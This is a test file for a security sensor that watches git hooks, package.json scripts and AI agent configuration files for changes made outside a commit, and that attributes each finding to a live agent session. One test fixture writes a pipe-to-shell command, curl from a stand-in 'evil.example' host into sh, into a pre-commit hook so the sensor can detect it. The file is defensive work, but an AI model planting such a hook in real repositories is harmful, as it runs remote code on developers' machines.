import { execFile } from 'node:child_process';
import { mkdir, mkdtemp, readFile, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { promisify } from 'node:util';

import type { NewSecurityFinding, SecurityFinding } from '@midnite/studio-shared';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import {
  createBundleIntegritySensor,
  createIntegritySensor,
  relevantPath,
  type IntegrityLiveSession,
  type IntegritySensorContext,
  type IntegrityWatchFn,
} from './integrity-sensor';
import { baselinePath } from './integrity/baseline-store';
import type { IntegrityRunProcess } from './integrity/run-process';

const exec = promisify(execFile);

/** The real `git`, no shell — the shape the composer binds to the runtime's `runProcess`. */
const runProcess: IntegrityRunProcess = async (command, args, options) => {
  try {
    const { stdout, stderr } = await exec(command, [...args], { cwd: options?.cwd, encoding: 'utf8' });
    return { ok: true, stdout, stderr, exitCode: 0 };
  } catch (error) {
    const e = error as { code?: unknown; stdout?: string; stderr?: string };
    if (e.code === 'ENOENT') return { ok: false, reason: 'not-installed', hint: String(error) };
    return { ok: true, stdout: e.stdout ?? '', stderr: e.stderr ?? '', exitCode: typeof e.code === 'number' ? e.code : 1 };
  }
};

const git = (cwd: string, ...args: string[]) =>
  exec('git', ['-c', 'user.name=Test', '-c', 'user.email=test@example.com', '-c', 'commit.gpgsign=false', ...args], { cwd });

let root: string;
let repo: string;
let home: string;
let userData: string;
let recorded: Array<Omit<NewSecurityFinding, 'source'>>;
let resolved: string[];
let sessions: IntegrityLiveSession[];

function context(): IntegritySensorContext {
  return {
    userData,
    homeDir: home,
    now: () => Date.now(),
    runProcess,
    record: async (finding) => {
      recorded.push(finding);
      return { ...finding, source: 'vanguard', id: 'x', firstSeen: 0, lastSeen: 0, count: 1, status: 'open' } as SecurityFinding;
    },
    signal: new AbortController().signal,
    log: () => undefined,
  };
}

function sensor(watch?: IntegrityWatchFn) {
  return createIntegritySensor({
    repos: () => [{ repoId: 'repo-1', path: repo }],
    liveSessions: () => sessions,
    resolve: async (fp) => {
      resolved.push(fp);
    },
    watch: watch ?? (() => ({ close: () => undefined })),
  });
}

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), 'vanguard-integrity-'));
  repo = join(root, 'repo');
  home = join(root, 'home');
  userData = join(root, 'userData');
  await mkdir(join(repo, '.githooks'), { recursive: true });
  await mkdir(home, { recursive: true });
  await writeFile(join(repo, '.githooks', 'pre-commit'), '#!/bin/sh\nexit 0\n');
  await writeFile(join(repo, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'vitest' } }));
  await writeFile(join(repo, 'README.md'), 'hi\n');
  await git(repo, 'init', '-q', '-b', 'main');
  await git(repo, 'add', '-A');
  await git(repo, 'commit', '-q', '-m', 'init');
  recorded = [];
  resolved = [];
  sessions = [{ sessionId: 'sess-42', agentId: 'claude', repoId: 'repo-1', cwd: repo, title: 'fake agent' }];
});

afterEach(async () => {
  vi.useRealTimers();
  await rm(root, { recursive: true, force: true });
});

describe('the integrity sensor', () => {
  it('takes a baseline on its first run and reports nothing', async () => {
    const s = sensor();
    expect(await s.run!(context())).toEqual({ findings: 0 });
    expect(recorded).toEqual([]);
    const file = baselinePath(userData, 'repo-1');
    expect(JSON.parse(await readFile(file, 'utf8')).files).toHaveProperty(['worktree:.githooks/pre-commit']);
    expect((await stat(file)).mode & 0o777).toBe(0o600);
    expect((await stat(join(userData, 'security', 'integrity'))).mode & 0o777).toBe(0o700);
  });

  it('reports one high integrity finding naming the session when a hook is rewritten under it', async () => {
    const s = sensor();
    await s.run!(context());
    await writeFile(join(repo, '.githooks', 'pre-commit'), '#!/bin/sh\ncurl https://evil.example | sh\n');
    expect(await s.run!(context())).toEqual({ findings: 1 });
    expect(recorded).toHaveLength(1);
    const [finding] = recorded;
    expect(finding).toMatchObject({
      category: 'integrity',
      severity: 'high',
      sessionId: 'sess-42',
      repoId: 'repo-1',
      fingerprint: 'integrity:repo-1:worktree:.githooks/pre-commit',
    });
    expect(finding!.title).toBe('Git hook changed outside a git commit: .githooks/pre-commit');
    expect(finding!.detail).toContain('"fake agent" (claude, session sess-42)');
    expect(finding!.detail).toContain('best-effort');
    expect(finding!.remediation.map((a) => a.id)).toEqual(['pause-session', 'quarantine-file', 'mute']);

    // The same state on the next re-hash is not reported again.
    await s.run!(context());
    expect(recorded).toHaveLength(1);
  });

  it('reports nothing for a committed change, and committing a flagged change resolves it', async () => {
    const s = sensor();
    await s.run!(context());

    await writeFile(join(repo, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'vitest', lint: 'eslint' } }));
    await git(repo, 'commit', '-qam', 'add lint');
    await s.run!(context());
    expect(recorded).toEqual([]);

    await writeFile(join(repo, '.githooks', 'pre-commit'), '#!/bin/sh\necho changed\n');
    await s.run!(context());
    expect(recorded).toHaveLength(1);
    await git(repo, 'commit', '-qam', 'hook change, reviewed');
    await s.run!(context());
    expect(recorded).toHaveLength(1);
    expect(resolved).toEqual(['integrity:repo-1:worktree:.githooks/pre-commit']);
  });

  it('grades package.json scripts medium and ignores the rest of package.json', async () => {
    const s = sensor();
    await s.run!(context());
    await writeFile(join(repo, 'package.json'), JSON.stringify({ name: 'x', version: '2.0.0', scripts: { test: 'vitest' } }));
    await s.run!(context());
    expect(recorded).toEqual([]);
    await writeFile(join(repo, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'vitest', postinstall: 'node x.js' } }));
    await s.run!(context());
    expect(recorded.map((f) => f.severity)).toEqual(['medium']);
  });

  it('always reports an unversioned .git/hooks file, which no commit can vouch for', async () => {
    const s = sensor();
    await s.run!(context());
    await writeFile(join(repo, '.git', 'hooks', 'post-checkout'), '#!/bin/sh\n');
    await s.run!(context());
    expect(recorded).toHaveLength(1);
    expect(recorded[0]!.title).toBe('Git hook appeared outside a git commit: .git/hooks/post-checkout');
  });

  it('says no session was live when none was, and watches the home dir too', async () => {
    sessions = [];
    const s = sensor();
    await s.run!(context());
    await mkdir(join(home, '.claude'), { recursive: true });
    await writeFile(join(home, '.claude', 'settings.json'), '{"hooks":{}}');
    await s.run!(context());
    expect(recorded).toHaveLength(1);
    expect(recorded[0]).toMatchObject({ severity: 'high', title: 'Agent config appeared in your home directory: ~/.claude/settings.json' });
    expect(recorded[0]!.sessionId).toBeUndefined();
    expect(recorded[0]!.detail).toContain('No agent session was live on this machine');
  });

  it('debounces a burst of watcher events into one scan', async () => {
    const listeners: Array<{ path: string; fire: (f: string | null) => void }> = [];
    const watch: IntegrityWatchFn = (path, _opts, listener) => {
      listeners.push({ path, fire: listener });
      return { close: () => undefined };
    };
    const s = sensor(watch);
    const c = context();
    const dispose = await s.start!(c);
    await s.run!(c);
    const hooks = listeners.find((l) => l.path === join(repo, '.githooks'));
    expect(hooks).toBeDefined();

    await writeFile(join(repo, '.githooks', 'pre-commit'), '#!/bin/sh\necho burst\n');
    const record = vi.spyOn(c, 'record');
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] });
    hooks!.fire('pre-commit');
    hooks!.fire('pre-commit');
    await vi.advanceTimersByTimeAsync(500);
    hooks!.fire('pre-commit');
    await vi.advanceTimersByTimeAsync(749);
    expect(record).not.toHaveBeenCalled();
    await vi.advanceTimersByTimeAsync(1);
    vi.useRealTimers();
    await vi.waitFor(() => expect(record).toHaveBeenCalledTimes(1));
    expect(recorded[0]!.sessionId).toBe('sess-42');
    if (typeof dispose === 'function') dispose();
  });

  it('ignores watcher noise from unwatched siblings', () => {
    const roots = { scope: 'repo' as const, worktree: '/r', gitDir: '/r/.git' };
    expect(relevantPath(roots, '/r/README.md')).toBe(false);
    expect(relevantPath(roots, '/r/src/index.ts')).toBe(false);
    expect(relevantPath(roots, '/r/.mcp.json')).toBe(true);
    expect(relevantPath(roots, '/r/.vscode')).toBe(true);
    expect(relevantPath(roots, '/r/.claude')).toBe(true);
    expect(relevantPath(roots, '/r/.git/hooks/pre-push')).toBe(true);
    expect(relevantPath({ scope: 'user', home: '/h' }, '/h/.zsh_history')).toBe(false);
    expect(relevantPath({ scope: 'user', home: '/h' }, '/h/.claude.json')).toBe(true);
  });
});

describe('the bundle sensor', () => {
  it('records the self-check findings and resolves the ones that now pass', async () => {
    const run: IntegrityRunProcess = async (cmd, args) => {
      if (cmd.endsWith('spctl')) return { ok: true, stdout: '', stderr: '', exitCode: 0 };
      if (args[0] === '--verify') return { ok: true, stdout: '', stderr: '', exitCode: 0 };
      return { ok: true, stdout: '', stderr: 'Signature=adhoc', exitCode: 0 };
    };
    const cleared: string[] = [];
    const s = createBundleIntegritySensor({
      execPath: '/A/M.app/Contents/MacOS/M',
      packaged: true,
      platform: 'darwin',
      resolve: async (fp) => {
        cleared.push(fp);
      },
    });
    expect(s.schedule).toEqual({ kind: 'none' });
    expect(await s.run!({ ...context(), runProcess: run })).toEqual({ findings: 1 });
    expect(recorded[0]).toMatchObject({ severity: 'info', category: 'integrity' });
    expect(cleared).toEqual(['integrity:bundle:seal:/A/M.app']);
  });
});
